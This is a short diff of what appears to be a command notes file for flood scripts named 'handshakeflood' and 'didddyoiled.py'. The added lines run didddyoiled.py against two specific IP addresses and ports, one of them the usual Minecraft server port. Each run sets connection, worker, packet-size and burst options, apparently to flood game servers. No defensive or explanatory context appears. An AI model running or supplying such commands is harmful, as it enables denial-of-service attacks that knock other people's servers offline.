@@ -7,4 +7,9 @@ python javafloodd_pass-handshakeflood.py
 handshakeflood
 
 #didddyoiled.py
+python didddyoiled.py --host 103.151.52.145 --port 25036 --conns 100 --workers 2 --min 65490 --max 65495 --mode-pattern alternate --burst 100
+
+
 python didddyoiled.py --host 42.96.22.198 --port 25565 --conns 100 --workers 2 --min 65490 --max 65495 --mode-pattern alternate --burst 100
+
+
